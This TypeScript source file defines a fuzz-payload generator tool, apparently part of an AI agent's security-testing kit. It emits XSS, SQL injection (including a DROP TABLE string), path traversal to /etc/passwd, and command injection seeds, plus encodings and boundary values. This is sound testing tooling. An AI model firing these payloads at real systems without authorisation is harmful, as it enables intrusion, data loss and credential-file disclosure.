// gen_fuzz_payloads — ARCHITECTURE.MD §5.E / Dev 1 task 7.
//
// Pure-compute payload generator: emits injection corpora, encoding
// variants, and boundary/edge values as DATA ONLY. Nothing here opens a
// socket, touches the filesystem, or sends anything anywhere — the agent
// feeds the returned strings into Dev 3's `replay_request` separately.
// Deterministic given the same input (no randomness, no clock reads).

import { Buffer } from 'node:buffer'
import type {
  CapabilityTool,
  FuzzBoundary,
  FuzzCorpus,
  FuzzEncoding,
  GenFuzzPayloadsInput,
  GenFuzzPayloadsOutput,
  ValidationResult
} from '../shared/tools'
import { arrOf, enumOf, obj, str } from './schema'

const VALID_CORPUS: readonly FuzzCorpus[] = [
  'xss',
  'sqli',
  'path-traversal',
  'command-injection'
]
const VALID_ENCODINGS: readonly FuzzEncoding[] = [
  'url',
  'double-url',
  'html-entity',
  'unicode',
  'base64'
]
const VALID_BOUNDARIES: readonly FuzzBoundary[] = [
  'empty',
  'huge',
  'null-byte',
  'format-string',
  'integer-bounds'
]

const CORPUS_SEEDS: Record<FuzzCorpus, readonly string[]> = {
  xss: [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg/onload=alert(1)>'
  ],
  sqli: [
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--"
  ],
  'path-traversal': [
    '../../../../etc/passwd',
    '..\\..\\..\\..\\windows\\win.ini',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//etc/passwd'
  ],
  'command-injection': [
    '; cat /etc/passwd',
    '| whoami',
    '`id`',
    '$(id)',
    '&& dir'
  ]
}

/** Lightweight hand-rolled encoders. No Buffer except for base64 (node:buffer, allowed). */
function applyEncoding(input: string, encoding: FuzzEncoding): string {
  switch (encoding) {
    case 'url':
      return encodeURIComponent(input)
    case 'double-url':
      return encodeURIComponent(encodeURIComponent(input))
    case 'html-entity':
      return input.replace(/[&<>"'/]/g, (ch) => {
        const map: Record<string, string> = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#39;',
          '/': '&#x2F;'
        }
        return map[ch] ?? ch
      })
    case 'unicode':
      return Array.from(input)
        .map((ch) => '\\u' + ch.codePointAt(0)!.toString(16).padStart(4, '0'))
        .join('')
    case 'base64':
      return Buffer.from(input, 'utf8').toString('base64')
  }
}

const BOUNDARY_VALUES: Record<FuzzBoundary, readonly string[]> = {
  empty: [''],
  huge: ['A'.repeat(10000), 'A'.repeat(65536)],
  'null-byte': ['\u0000', 'foo\u0000bar', '%00'],
  'format-string': ['%s%s%s%s', '%n', '%x%x%x%x', '{0}{1}{2}'],
  'integer-bounds': [
    '-1',
    '0',
    '2147483647',
    '2147483648',
    '-2147483648',
    '9223372036854775807',
    '1.7976931348623157e+308'
  ]
}

function isStringArray(v: unknown): v is string[] {
  return Array.isArray(v) && v.every((x) => typeof x === 'string')
}

function validate(raw: unknown): ValidationResult<GenFuzzPayloadsInput> {
  const errors: string[] = []
  if (typeof raw !== 'object' || raw === null || Array.isArray(raw)) {
    return { ok: false, errors: ['input must be an object'] }
  }
  const obj = raw as Record<string, unknown>

  if (!isStringArray(obj.corpus)) {
    errors.push('corpus must be a string[]')
  } else if (obj.corpus.some((c) => !VALID_CORPUS.includes(c as FuzzCorpus))) {
    errors.push(`corpus entries must be one of ${VALID_CORPUS.join(', ')}`)
  }

  if (!isStringArray(obj.encodings)) {
    errors.push('encodings must be a string[]')
  } else if (obj.encodings.some((e) => !VALID_ENCODINGS.includes(e as FuzzEncoding))) {
    errors.push(`encodings entries must be one of ${VALID_ENCODINGS.join(', ')}`)
  }

  if (!isStringArray(obj.boundaries)) {
    errors.push('boundaries must be a string[]')
  } else if (obj.boundaries.some((b) => !VALID_BOUNDARIES.includes(b as FuzzBoundary))) {
    errors.push(`boundaries entries must be one of ${VALID_BOUNDARIES.join(', ')}`)
  }

  if (errors.length > 0) {
    return { ok: false, errors }
  }

  return {
    ok: true,
    value: {
      corpus: obj.corpus as FuzzCorpus[],
      encodings: obj.encodings as FuzzEncoding[],
      boundaries: obj.boundaries as FuzzBoundary[]
    }
  }
}

function generate(input: GenFuzzPayloadsInput): GenFuzzPayloadsOutput {
  const out: string[] = []

  // Injection corpora, raw and encoded — order is deterministic (input order).
  for (const corpus of input.corpus) {
    for (const seed of CORPUS_SEEDS[corpus]) {
      out.push(seed)
      for (const enc of input.encodings) {
        out.push(applyEncoding(seed, enc))
      }
    }
  }

  // Boundary/edge values stand on their own (encoding them would blur the signal).
  for (const boundary of input.boundaries) {
    for (const value of BOUNDARY_VALUES[boundary]) {
      out.push(value)
    }
  }

  return out
}

export const genFuzzPayloadsTool: CapabilityTool<GenFuzzPayloadsInput, GenFuzzPayloadsOutput> = {
  name: 'gen_fuzz_payloads',
  description:
    'Generates fuzz payload sets (injection corpora, encoding variants, boundary values) as data. Pure compute; never sends anything.',
  riskTier: 'read-only',
  inputSchema: obj(
    {
      corpus: arrOf(enumOf(VALID_CORPUS, 'Injection corpora to emit payloads for.'), 'Corpora to include.'),
      encodings: arrOf(enumOf(VALID_ENCODINGS, 'Encoding transforms to apply to each payload.'), 'Encodings to apply.'),
      boundaries: arrOf(enumOf(VALID_BOUNDARIES, 'Boundary/edge-value categories to emit.'), 'Boundary categories to include.')
    },
    ['corpus', 'encodings', 'boundaries']
  ),
  outputSchema: arrOf(str('A generated payload string.'), 'Generated payloads, in input order.'),
  validateInput: validate,
  handler: generate
}
